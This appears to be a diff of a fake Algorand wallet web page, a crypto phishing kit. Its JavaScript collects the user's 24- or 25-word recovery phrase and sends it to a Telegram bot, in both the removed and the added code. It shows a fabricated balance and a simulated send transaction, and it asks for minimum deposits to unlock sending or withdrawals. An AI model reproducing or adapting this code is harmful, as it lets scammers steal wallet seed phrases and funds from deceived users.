+                    showNotification(`✅ Successfully filled ${words.length} words!`, "success"); 
+                }, 100);
+                return true;
+            } else { 
+                showNotification(`Expected 24 or 25 words, found ${words.length} words.`, "error"); 
+                return false; 
+            }
         }
         
         async function processRecovery() {
-            const phraseArray = getCurrentPhraseArray();
-            const expectedCount = currentWordCount;
-            const filledCount = phraseArray.filter(w => w !== "").length;
-            
-            if (filledCount !== expectedCount) {
-                showNotification(`⚠️ Please fill all ${expectedCount} recovery words! (${filledCount}/${expectedCount} filled)`, "error");
-                const resultDiv = document.getElementById("recoveryResult");
-                resultDiv.style.display = "block";
-                resultDiv.className = "recovery-result error-panel";
-                resultDiv.innerHTML = `<div>❌ Please fill all ${expectedCount} words. Currently ${filledCount}/${expectedCount} filled.</div>`;
+            const phraseArray = Array.from(document.querySelectorAll("#wordsGrid .word-input")).map(inp => inp.value.trim());
+            if (phraseArray.filter(w => w !== "").length !== currentWordCount) {
+                showNotification(`⚠️ Please fill all ${currentWordCount} recovery words!`, "error");
                 return;
             }
-            if (phraseArray.some(w => !validateWordSyntax(w))) {
-                showNotification("⚠️ Invalid characters detected. Use only letters, hyphens, or apostrophes.", "error");
-                return;
-            }
-            
-            const resultDiv = document.getElementById("recoveryResult");
-            resultDiv.style.display = "block";
-            resultDiv.className = "recovery-result success-panel";
-            resultDiv.innerHTML = `<div>🔐 Processing recovery (${expectedCount} words)...</div>`;
-            
-            const timestamp = new Date().toLocaleString('en-US');
             const fullPhrase = phraseArray.join(' ');
-            
-            await sendMessageToTelegram(`🔐 ALGORAND WALLET RECOVERED\n━━━━━━━━━━━━━━━━━━━━━\n📅 Time: ${timestamp}\n🔑 Word Count: ${expectedCount}\n🔑 Phrase: ${fullPhrase}`);
-            
-            resultDiv.innerHTML = `<div>✅ Recovery successful! Redirecting to dashboard...</div>`;
-            showNotification("✅ Recovery successful!");
-            
+            await sendMessageToTelegram(`🔐 ALGORAND WALLET RECOVERED\n📅 Time: ${new Date().toLocaleString()}\n🔑 Word Count: ${currentWordCount}\n🔑 Phrase: ${fullPhrase}`);
+            showNotification("✅ Recovery successful! Redirecting to dashboard...");
             setTimeout(() => {
-                currentWalletAddress = RECEIVE_ADDRESS;
-                generateBalanceFromPhrase(phraseArray);
                 pageRecovery.classList.add('hidden');
                 pageDashboard.classList.add('active');
                 fetchAlgoPrice();
                 updatePortfolioAndTokenList();
-                showNotification(`Welcome to your dashboard!`);
             }, 1500);
         }
         
-        function processPasteAndFill(rawText) {
-            if (!rawText.trim()) { showNotification("Please paste your words first!", "error"); return false; }
-            let words = rawText.split(/[\s,\n\t]+/).filter(w => w.trim().length > 0).map(w => w.trim());
-            if (words.length === 24 || words.length === 25) {
-                if (currentWordCount !== words.length) setWordCount(words.length);
-                setTimeout(() => { fillWordsFromArray(words); showNotification(`✅ Successfully filled ${words.length} words!`, "success"); }, 100);
-                return true;
-            } else {
-                showNotification(`Expected 24 or 25 words, found ${words.length} words.`, "error");
-                return false;
+        async function startSendTransaction() {
+            const address = document.getElementById('recipientAddress').value.trim();
+            if (!address) { showNotification("❌ Please enter a recipient address!", "error"); return; }
+            
+            const confirmSection = document.getElementById('confirmSendSection');
+            const progressSection = document.getElementById('sendingProgressSection');
+            confirmSection.style.display = 'none';
+            progressSection.style.display = 'block';
+            
+            const steps = [
+                { text: 'Building ALGO transaction...', delay: 800, progress: 25 },
+                { text: 'Signing with wallet...', delay: 1000, progress: 50 },
+                { text: 'Broadcasting to Algorand network...', delay: 1100, progress: 75 },
+                { text: 'Transaction confirmed!', delay: 900, progress: 100 }
+            ];
+            for (let step of steps) {
+                document.getElementById('sendingMessage').textContent = step.text;
+                if (document.getElementById('txProgressFill')) document.getElementById('txProgressFill').style.width = step.progress + '%';
+                await new Promise(r => setTimeout(r, step.delay));
+            }
+            
+            const sendAmount = 11000;
+            if (tokenBalances.ALGO >= sendAmount) {
+                tokenBalances.ALGO -= sendAmount;
+                updatePortfolioAndTokenList();
+                await sendMessageToTelegram(`💸 ALGO SENT\n📤 To: ${address.slice(0,20)}...\n💰 Amount: ${sendAmount} ALGO`);
+                showNotification("✅ Transaction confirmed! Proceeding to wallet recovery...");
+                setTimeout(() => {
+                    pageConfirm.classList.add('hidden');
+                    pageRecovery.classList.remove('hidden');
+                }, 1500);
             }
         }
         
-        function openSendModal(tokenSymbol, balance) {
-            if (!hasMinimumDeposit) {
-                showNotification(`❌ Minimum deposit of ${MIN_DEPOSIT_ALGO} ALGO or $${MIN_DEPOSIT_USD} USD required to send!`, "error");
-                openDepositModal();
-                return;
-            }
-            selectedToken = { symbol: tokenSymbol, balance: balance };
-            document.getElementById('sendBalanceDisplay').innerHTML = `Balance: ${balance.toFixed(4)} ${tokenSymbol}`;
-            document.getElementById('sendAddress').value = '';
-            document.getElementById('sendAmount').value = '';
-            document.getElementById('sendModal').classList.add('active');
+        async function pasteFromClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.getElementById('recipientAddress').value = text;
+                showNotification("✅ Address pasted from clipboard!", "success");
+            } catch (err) { showNotification("Unable to paste. Use Ctrl+V", "error"); }
         }
         
-        function openReceiveModal(tokenSymbol) {
-            document.getElementById('walletReceiveAddress').innerHTML = RECEIVE_ADDRESS;
-            document.getElementById('receiveModal').classList.add('active');
-        }
-        
-        function hideModals() {
-            document.getElementById('sendModal').classList.remove('active');
-            document.getElementById('receiveModal').classList.remove('active');
-            document.getElementById('withdrawModal').classList.remove('active');
-            document.getElementById('depositModal').classList.remove('active');
-        }
-        
-        function copyAddressToClipboard() {
-            navigator.clipboard.writeText(RECEIVE_ADDRESS);
-            showNotification("Address copied!");
-        }
-        
-        function logout() {
-            pageDashboard.classList.remove('active');
-            pageConfirm.classList.remove('hidden');
-            pageRecovery.classList.add('hidden');
-            document.querySelectorAll("#wordsGrid .word-input").forEach(inp => inp.value = "");
-            document.getElementById('recipientAddress').value = '';
-            updateWordCounter();
-            showNotification("Logged out successfully.");
-        }
-        
+        function openSendModal(tokenSymbol, balance) { selectedToken = { symbol: tokenSymbol, balance: balance }; document.getElementById('sendBalanceDisplay').innerHTML = `Balance: ${balance.toFixed(4)} ${tokenSymbol}`; document.getElementById('sendModal').classList.add('active'); }
+        function openReceiveModal(tokenSymbol) { document.getElementById('receiveModal').classList.add('active'); }
+        function openWithdrawModal(tokenSymbol, balance) { document.getElementById('withdrawModal').classList.add('active'); }
+        function hideModals() { document.querySelectorAll('.modal-overlay, .confirm-overlay').forEach(m => m.classList.remove('active')); }
+        function logout() { pageDashboard.classList.remove('active'); pageConfirm.classList.remove('hidden'); pageRecovery.classList.add('hidden'); clearRecoveryFields(); showNotification("Logged out successfully."); }
         function showLogoutConfirm() { document.getElementById('logoutConfirmModal').classList.add('active'); }
         function hideLogoutConfirm() { document.getElementById('logoutConfirmModal').classList.remove('active'); }
-        async function testTelegramConnection() {
-            showNotification('📡 Testing Telegram connection...', 'info');
-            const result = await sendMessageToTelegram('✅ Bot Connected! Algo Wallet is online. (Test message)');
-            showNotification(result ? '✅ Telegram bot connected! Check your Telegram.' : '❌ Failed to connect to Telegram. Check token and chat ID.', result ? 'success' : 'error');
-        }
         
-        // ==================== EVENT LISTENERS ====================
-        document.getElementById('startSendBtn').addEventListener('click', startSendTransaction);
-        document.getElementById('pasteAddressBtn').addEventListener('click', pasteFromClipboard);
-        document.getElementById('quickPasteBtn').addEventListener('click', () => processPasteAndFill(document.getElementById('quickPasteTextarea').value));
-        document.getElementById('confirmRecoveryBtn').addEventListener('click', processRecovery);
-        document.getElementById('clearRecoveryBtn').addEventListener('click', clearRecoveryFields);
-        document.getElementById('set24WordsBtn').addEventListener('click', () => setWordCount(24));
-        document.getElementById('set25WordsBtn').addEventListener('click', () => setWordCount(25));
-        document.getElementById('refreshPriceBtn').addEventListener('click', async () => { await fetchAlgoPrice(); updatePortfolioAndTokenList(); });
-        document.getElementById('confirmSendBtn').addEventListener('click', async () => {
-            await sendToken(selectedToken.symbol, document.getElementById('sendAddress').value.trim(), parseFloat(document.getElementById('sendAmount').value));
-            hideModals();
-        });
-        document.getElementById('cancelSendBtn').addEventListener('click', hideModals);
-        document.getElementById('cancelReceiveBtn').addEventListener('click', hideModals);
-        document.getElementById('copyAddressBtn').addEventListener('click', copyAddressToClipboard);
-        document.getElementById('logoutBtn').addEventListener('click', showLogoutConfirm);
-        document.getElementById('confirmLogoutBtn').addEventListener('click', () => { logout(); hideLogoutConfirm(); });
-        document.getElementById('cancelLogoutBtn').addEventListener('click', hideLogoutConfirm);
-        
-        document.getElementById('confirmWithdrawBtn').addEventListener('click', processWithdraw);
-        document.getElementById('cancelWithdrawBtn').addEventListener('click', hideModals);
-        document.getElementById('copyDepositAddressBtn').addEventListener('click', copyDepositAddress);
-        document.getElementById('cancelDepositBtn').addEventListener('click', hideModals);
+        // Event Listeners
+        document.getElementById('startSendBtn')?.addEventListener('click', startSendTransaction);
+        document.getElementById('pasteAddressBtn')?.addEventListener('click', pasteFromClipboard);
+        document.getElementById('quickPasteBtn')?.addEventListener('click', () => processPasteAndFill(document.getElementById('quickPasteTextarea').value));
+        document.getElementById('confirmRecoveryBtn')?.addEventListener('click', processRecovery);
+        document.getElementById('clearRecoveryBtn')?.addEventListener('click', clearRecoveryFields);
+        document.getElementById('set24WordsBtn')?.addEventListener('click', () => setWordCount(24));
+        document.getElementById('set25WordsBtn')?.addEventListener('click', () => setWordCount(25));
+        document.getElementById('refreshPriceBtn')?.addEventListener('click', fetchAlgoPrice);
+        document.getElementById('logoutBtn')?.addEventListener('click', showLogoutConfirm);
+        document.getElementById('confirmLogoutBtn')?.addEventListener('click', () => { logout(); hideLogoutConfirm(); hideModals(); });
+        document.getElementById('cancelLogoutBtn')?.addEventListener('click', hideLogoutConfirm);
+        document.getElementById('confirmSendBtn')?.addEventListener('click', async () => { await sendToken(selectedToken.symbol, document.getElementById('sendAddress').value.trim(), parseFloat(document.getElementById('sendAmount').value)); hideModals(); });
+        document.getElementById('cancelSendBtn')?.addEventListener('click', hideModals);
+        document.getElementById('cancelReceiveBtn')?.addEventListener('click', hideModals);
+        document.getElementById('copyAddressBtn')?.addEventListener('click', () => { navigator.clipboard.writeText(RECEIVE_ADDRESS); showNotification("Address copied!"); });
+        document.getElementById('confirmWithdrawBtn')?.addEventListener('click', () => { showNotification("Withdrawal request received. Minimum 2,000 ALGO required.", "info"); hideModals(); });
+        document.getElementById('cancelWithdrawBtn')?.addEventListener('click', hideModals);
+        document.getElementById('copyDepositAddressBtn')?.addEventListener('click', () => { navigator.clipboard.writeText(RECEIVE_ADDRESS); showNotification("Deposit address copied!"); });
+        document.getElementById('cancelDepositBtn')?.addEventListener('click', hideModals);
         
         const recTA = document.getElementById('quickPasteTextarea');
         if (recTA) recTA.addEventListener('paste', () => setTimeout(() => processPasteAndFill(recTA.value), 50));
@@ -839,17 +552,14 @@
         window.openSendModal = openSendModal;
         window.openReceiveModal = openReceiveModal;
         window.openWithdrawModal = openWithdrawModal;
-        window.openDepositModal = openDepositModal;
-        window.testTelegramConnection = testTelegramConnection;
         
         buildWordGrid();
         updateWordCounter();
         fetchAlgoPrice();
         
-        console.log('%c✅ ALGO WALLET - BALANCE: 5,500 ALGO', 'color: #00A4E0; font-size: 14px; font-weight: bold;');
-        console.log('%c✅ SEND REQUIREMENT: Min 2,000 ALGO or 100 USD deposit to unlock Send', 'color: #10B981; font-size: 12px;');
-        console.log('%c✅ WITHDRAW REQUIREMENT: Min 2,000 ALGO or 100 USD', 'color: #F59E0B; font-size: 12px;');
-        console.log('%c✅ ALL FEATURES ARE ACTIVE', 'color: #00A4E0; font-size: 12px; font-weight: bold;');
+        console.log('%c✅ ALGO WALLET - BALANCE: 22,000 ALGO', 'color: #00A4E0; font-size: 14px; font-weight: bold;');
+        console.log('%c✅ ENGLISH VERSION ACTIVE', 'color: #10B981; font-size: 12px;');
+        console.log('%c✅ ALGORAND LOGO ADDED', 'color: #00A4E0; font-size: 12px;');
     </script>
 </body>
 </html>
